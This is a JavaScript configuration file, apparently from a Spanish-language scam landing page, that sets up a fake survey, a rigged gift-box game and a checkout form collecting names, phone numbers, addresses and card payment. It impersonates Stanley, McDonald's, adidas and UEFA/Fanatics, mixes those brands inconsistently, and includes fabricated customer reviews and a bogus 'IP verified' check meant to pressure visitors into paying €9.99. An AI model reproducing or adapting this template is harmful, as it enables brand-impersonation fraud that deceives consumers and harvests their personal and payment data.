const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href.replace('/index.html', "");
const baseHref = window.location.protocol + "//" + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "es";
  const lang = "es";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Talla: ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };
  // I FILL THIS INFO IN MAIN.JS
  const mainProduct = {
    header: "",
    name: "",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    coupon: "",
    text: `,
Felicidades!<br><br>
Participaste en la promoción de Stanley: tienes la oportunidad de comprar el termo con molde para hielo STANLEY QUENCHER H2.0 por solo <b>$37</b>!
`,
  };

  const notifications = [
    // {
    // 	user: "Manuel S*****",
    // 	location: "Barcelona, España",
    // 	action: "¡Acabo de recibir la joya por 1,95 euros!",
    // 	timeago: "hace 15 segundos",
    // },
    // {
    // 	user: "Carlos B******",
    // 	location: "Madrid, España",
    // 	action: "¡Acabo de recibir la joya por 1,95 euros!",
    // 	timeago: "hace 25 segundos",
    // },
  ];

  const reviewsArr = [
    {
      name: "Mateo",
      time: "Hace un día",
      header: "¡Es increíble!",
      product: "26468782",
      review: "Como fan del fútbol durante muchos años, me sorprendió mucho la calidad de la camiseta de la selección nacional de España a un precio muy razonable 😊",
    },
    {
      name: "Lucas",
      time: "Hace dos días",
      header: "¡Genial! No tengo palabras.",
      product: "26468789",
      review: "Decidí comprar la camiseta de la selección nacional de España por primera vez y ahora disfruto de ella cada vez que apoyo a mi equipo, gracias.",
    },
    {
      name: "Valentina",
      time: "Hace dos días",
      header: "Simplemente genial.",
      product: "26468785",
      review: "La calidad de la camiseta es increíble, y el tamaño es perfecto! Gracias, la recomendaré a mis amigos.",
    },
    {
      name: "Santiago",
      time: "Hace cuatro días",
      header: "Me gusta",
      review: "Sinceramente, me encanta ver fútbol, y la nueva camiseta de la selección nacional de España era exactamente lo que necesitaba.",
    },
    {
      name: "Martina",
      time: "Hace siete días",
      header: "¡Guau, me encanta este producto!",
      product: "26468784",
      review: "Al principio pensé que la camiseta era cara, pero afortunadamente la compré y ahora disfruto de los mejores partidos con ella. ¡Gracias!",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "OPINIONES Y RESEÑAS",
    percent: "99%",
    rec: "Comentarios sobre esta promoción",
  };

  const questions = {
    _of: "Pregunta {1} de {2}: ",
    arr: [
      {
        q: "¿Alguna vez has pedido productos de McDonald's?",
        a: [
          "Sí, pido con frecuencia",
          "Sí, pido raramente",
          "Nunca he pedido",
        ],
      },
      {
        q: "¿Debería McDonald's continuar con este tipo de campañas publicitarias?",
        a: ["¡Sí, por supuesto!", "Sí, pero cambien el menú promocional", "No"],
      },
      {
        q: "¿Recomendarías nuestros productos a tus amigos?",
        a: ["Sí", "No"],
      },
    ],
  };

  const check = {
    title: "Tu respuesta será revisada",
    arr: [
      "Has respondido a la pregunta 3 de 3",
      "Tu dirección IP no muestra pedidos anteriores",
      "Tu respuesta ha sido verificada",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "¡Gracias por participar en la encuesta!",
        button: "Prueba tu suerte",
        text: `
<center>
    Para obtener el menú de McDonald's a precio promocional, debes elegir la caja de regalos correcta.
    <br><br>
    ¡Tienes 3 intentos, buena suerte!
</center>
            `,
      },
    },
    first: {
      texts: {
        header: "Oh, no..",
        button: "Inténtalo de nuevo",
        text: `
<center>
    Lamentablemente, este regalo está vacío. Te quedan dos intentos, ¡buena suerte!
</center>
            `,
      },
    },
    win: {
      texts: {
        header: "Camiseta adidas primera equipación España 24",
        button: "Obtén el cupón",
        text: `
<center>
    <p style="color: #ffffff"></p>
    <br>
    Haz clic en "Obtén el cupón", completa el formulario y paga el pedido.
    <br><br>
    Recibe un mensaje de texto con el cupón e instrucciones para activarlo.
    <br><br>
    El cupón se puede activar en cualquier momento y no requiere pago adicional.
</center>
            `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "Información personal",
      fields: {
        name: {
          enabled: true,
          field: "Nombre",
        },
        family: {
          enabled: true,
          field: "Apellido",
        },
        phone: {
          enabled: true,
          field: "Número de teléfono",
        },
        email: {
          enabled: true,
          field: "Correo electrónico",
        },
      },
    },
    delivery: {
      title: "Entrega",
      fields: {
        city: {
          enabled: true,
          field: "Ciudad",
        },
        address: {
          enabled: true,
          field: "Dirección de entrega",
        },
        zip: {
          enabled: true,
          field: "Código postal",
        },
      },
    },
    payment: {
      title: "Métodos de pago",
      creditCard: "Pago en línea con tarjeta de crédito",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Detalles del pedido",
      oldPrice: "€95.00",
      newPrice: "€9.99",
      size: "Talla",
      subTotal: {
        title: "Subtotal",
        amount: "€9.99",
      },
      delivery: {
        title: "Entrega",
        amount: "€0.00",
      },
      total: {
        title: "Total",
        amount: "€9.99",
      },
      checkoutButton: "Paga tu pedido",
    },
  };

  const products = [
    {
      id: "26468784",
      name: "Camiseta adidas primera equipación España 24",
      miniImg: "./src/img/slide3.png",
      images: ["./src/img/slide3.png"],
    },
    {
      id: "26468782",
      name: "Camiseta adidas primera equipación España 24",
      miniImg: "./src/img/slide1.png",
      images: ["./src/img/slide1.png"],
    },
    {
      id: "26468783",
      name: "Camiseta adidas primera equipación España 24",
      miniImg: "./src/img/slide2.png",
      images: ["./src/img/slide2.png"],
    },
  ];

  const footer = {
    cr: "© 2024, UEFA and Fanatics, Inc.. All rights reserved. No portion of this site may be reproduced or duplicated without the express permission of UEFA and/or Fanatics (as applicable). The words UEFA, UEFA Nations League, UEFA Nations League Finals, Finalissima, UEFA U21 Championships, UEFA EURO and UEFA Women’s EURO and all other UEFA marks, names, mascots and trophies are the property, registered trademarks, designs and/or copyright of UEFA. Store maintained and operated by Fanatics (International) Limited.",
  };

  const pathImgBox = {
    lid: "./src/img/box-lid.png",
    lidIOs: "./src/img/box-lid-ios.png",
    inner: "./src/img/box-inner.png",
    innerGift: "./src/img/box-inner-gift.png",
    box: "./src/img/box.png",
    boxModal: "./src/img/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");


  ///
  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "/");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value =
    mainProduct.name + ": " + product.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
  document
    .querySelector(".checkout_header")
    .setAttribute("style", "display: flex");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};


document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});